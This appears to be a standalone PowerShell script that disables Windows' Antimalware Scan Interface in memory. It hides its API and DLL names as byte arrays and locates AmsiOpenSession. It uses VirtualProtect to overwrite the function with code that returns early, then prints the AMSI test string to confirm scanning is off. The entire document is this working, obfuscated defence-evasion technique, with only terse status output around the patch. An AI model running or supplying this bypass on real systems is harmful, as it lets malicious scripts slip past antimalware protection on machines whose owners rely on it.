function gs([byte[]]$b){[System.Text.Encoding]::UTF8.GetString($b)}

function gpa([string]$m,[string]$f){
    $a=([AppDomain]::CurrentDomain.GetAssemblies()|
        Where-Object{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll'}
    ).GetType($(gs([byte[]](77,105,99,114,111,115,111,102,116,46,87,105,110,51,50,46,85,110,115,97,102,101,78,97,116,105,118,101,77,101,116,104,111,100,115))))
    $h=$a.GetMethod($(gs([byte[]](71,101,116,77,111,100,117,108,101,72,97,110,100,108,101)))).Invoke($null,@($m))
    $t=@()
    $a.GetMethods()|ForEach-Object{if($_.Name -eq $(gs([byte[]](71,101,116,80,114,111,99,65,100,100,114,101,115,115)))){$t+=$_}}
    $t[0].Invoke($null,@($h,$f))
}

$addr=gpa (gs([byte[]](97,109,115,105,46,100,108,108))) (gs([byte[]](65,109,115,105,79,112,101,110,83,101,115,115,105,111,110)))
"[*] 0x{0:X}" -f $addr.ToInt64()

$pre=New-Object byte[] 8
[System.Runtime.InteropServices.Marshal]::Copy($addr,$pre,0,8)
"[*] $($pre|%{'{0:X2}' -f $_})"

Read-Host "[*]"

$td=([AppDomain]::CurrentDomain.DefineDynamicAssembly(
    (New-Object System.Reflection.AssemblyName('x')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run
).DefineDynamicModule('y',$false).DefineType('z','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate])|%{
    $_.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,
        @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())).SetImplementationFlags('Runtime,Managed')
    $_.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',[Bool],
        @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType())).SetImplementationFlags('Runtime,Managed')
    $_.CreateType()
})
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (gpa (gs([byte[]](107,101,114,110,101,108,51,50,46,100,108,108))) (gs([byte[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)))),$td)

$b=[Byte[]](0xB8,0x01,0x00,0x00,0x00,0xC3)
$o=0
$vp.Invoke($addr,[UInt32]$b.Length,0x40,[ref]$o)
[System.Runtime.InteropServices.Marshal]::Copy($b,0,$addr,$b.Length)
$vp.Invoke($addr,[UInt32]$b.Length,$o,[ref]$o)

$post=New-Object byte[] 8
[System.Runtime.InteropServices.Marshal]::Copy($addr,$post,0,8)
"[*] $($post|%{'{0:X2}' -f $_})"

$t=[char[]]@(65,77,83,73,32,84,101,115,116,32,83,97,109,112,108,101,58,32,55,101,55,50,99,51,99,101,45,56,54,49,98,45,52,51,51,57,45,56,55,52,48,45,48,97,99,49,52,56,52,99,49,51,56,54)-join''
"[*] $t"
